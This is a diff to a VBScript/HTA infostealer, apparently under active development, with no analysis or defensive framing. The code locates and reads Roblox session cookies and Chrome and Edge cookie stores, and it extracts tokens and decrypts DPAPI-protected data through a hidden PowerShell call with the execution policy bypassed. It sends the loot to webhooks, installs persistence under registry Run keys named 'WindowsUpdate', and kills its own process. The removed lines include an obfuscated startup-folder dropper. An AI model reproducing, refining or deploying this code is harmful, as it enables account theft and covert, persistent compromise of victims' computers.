@@ -24,18 +24,8 @@ Call GrabRoblox(True)
 Call GrabTokens(True)
 Call Persistence(True)
 
-' --- Re-run grab chain 4x (every 5 min) (Re-Grab only) ---
-Dim runCount
-For runCount = 1 To 4
-    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, WH_REGRAB)
-    Call IP(False)
-    Call GrabRoblox(False)
-    Call GrabTokens(False)
-    If runCount < 4 Then Call SleepMinutes(5)
-Next
-
-' --- KILL SELF (Waits 10 seconds to ensure everything uploads) ---
-Call SleepSeconds(10)
+' --- KILL SELF ---
+Call SleepSeconds(4)
 sh.Run "taskkill /f /im mshta.exe", 0, False
 window.close()
 
@@ -59,34 +49,19 @@ End Sub
 
 ' --- GrabRoblox Function ---
 Sub GrabRoblox(isFirstGrab)
-    Dim paths(6)
-    ' Searching all known modern and legacy paths
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    Dim paths(7)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
     paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Network\Cookies"
-    paths(5) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    paths(5) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Network\Cookies"
+    paths(6) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Edge\User Data\Default\Network\Cookies"
     
     Dim i, fp, raw
-    For i = 0 To 5
+    For i = 0 To 6
         If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
     Next
-    
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp : Exit For
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    End If
     
     If Len(fp) = 0 Then Exit Sub
     raw = ReadFile(fp)
@@ -124,42 +99,6 @@ Sub GrabRoblox(isFirstGrab)
         Call RouteMessage(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, isFirstGrab)
         Call RouteFile("cookie.txt", cookie, isFirstGrab)
     End If
-End Sub
-
-' --- Sleep Functions ---
-Sub SleepSeconds(s)
-    Dim t0, t1, t2, elapsed
-    t0 = Timer()
-    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
-    sh.Run cmd, 0, True
-    elapsed = Timer() - t0
-    If elapsed < 0 Then elapsed = elapsed + 86400
-    If elapsed < s Then
-        t1 = Timer()
-        Do
-            t2 = Timer()
-            If t2 < t1 Then t2 = t2 + 86400
-            If (t2 - t1) >= (s - elapsed) Then Exit Do
-        Loop
-    End If
-End Sub
-
-Sub SleepMinutes(m)
-    Call SleepSeconds(m * 60)
-End Sub
-
-' --- Persistence ---
-Sub Persistence(isFirstGrab)
-    On Error Resume Next
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", PAYLOAD_URL, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", PAYLOAD_URL, "REG_SZ"
-
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & PAYLOAD_URL & """&Chr(34), 0, False"
-    sf.Close
-
-    Call RouteMessage(":pushpin: Persistence", "Startup installed to boot HTA", 65280, isFirstGrab)
 End Sub
 
 ' --- GrabTokens (Native LevelDB Extraction) ---
@@ -212,6 +151,51 @@ Function ExtractToken(s)
     End If
 End Function
 
+' --- DecryptDPAPI (Pure VBScript Method) ---
+Function DecryptDPAPI(b64)
+    DecryptDPAPI = ""
+    On Error Resume Next
+    Dim xml: Set xml = CreateObject("MSXML2.DOMDocument")
+    Dim node: Set node = xml.createElement("base64")
+    node.dataType = "bin.base64"
+    node.text = b64
+    Dim bytes: bytes = node.nodeTypedValue
+    
+    Dim cap: Set cap = CreateObject("CAPICOM.Utilities")
+    If cap Is Nothing Then
+        ' Fallback to PowerShell if CAPICOM fails
+        Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String('" & b64 & "');$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)}catch{}"
+        DecryptDPAPI = sh.Run("powershell -NoP -Exec Bypass -c """ & ps & """", 0, True)
+    Else
+        DecryptDPAPI = cap.Decrypt(bytes)
+    End If
+End Function
+
+' --- Persistence ---
+Sub Persistence(isFirstGrab)
+    On Error Resume Next
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", PAYLOAD_URL, "REG_SZ"
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", PAYLOAD_URL, "REG_SZ"
+End Sub
+
+' --- Sleep Function ---
+Sub SleepSeconds(s)
+    Dim t0, t1, t2, elapsed
+    t0 = Timer()
+    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
+    sh.Run cmd, 0, True
+    elapsed = Timer() - t0
+    If elapsed < 0 Then elapsed = elapsed + 86400
+    If elapsed < s Then
+        t1 = Timer()
+        Do
+            t2 = Timer()
+            If t2 < t1 Then t2 = t2 + 86400
+            If (t2 - t1) >= (s - elapsed) Then Exit Do
+        Loop
+    End If
+End Sub
+
 ' --- Routing ---
 Sub RouteMessage(t, d, c, isFirstGrab)
     If isFirstGrab Then
@@ -258,23 +242,6 @@ Sub PostFileTo(fn, ct, target_wh)
     h.Send bd
     Set h = Nothing
 End Sub
-
-' --- DecryptDPAPI ---
-Function DecryptDPAPI(b64)
-    DecryptDPAPI = ""
-    Dim inf: inf = TmpFile("dpi.txt")
-    Dim outf: outf = TmpFile("dpo.txt")
-    fso.DeleteFile outf, True
-    WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"""
-    Dim psf: psf = TmpFile("dpapi.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True
-    fso.DeleteFile psf, True
-    fso.DeleteFile outf, True
-End Function
 
 ' --- Ej ---
 Function Ej(s)
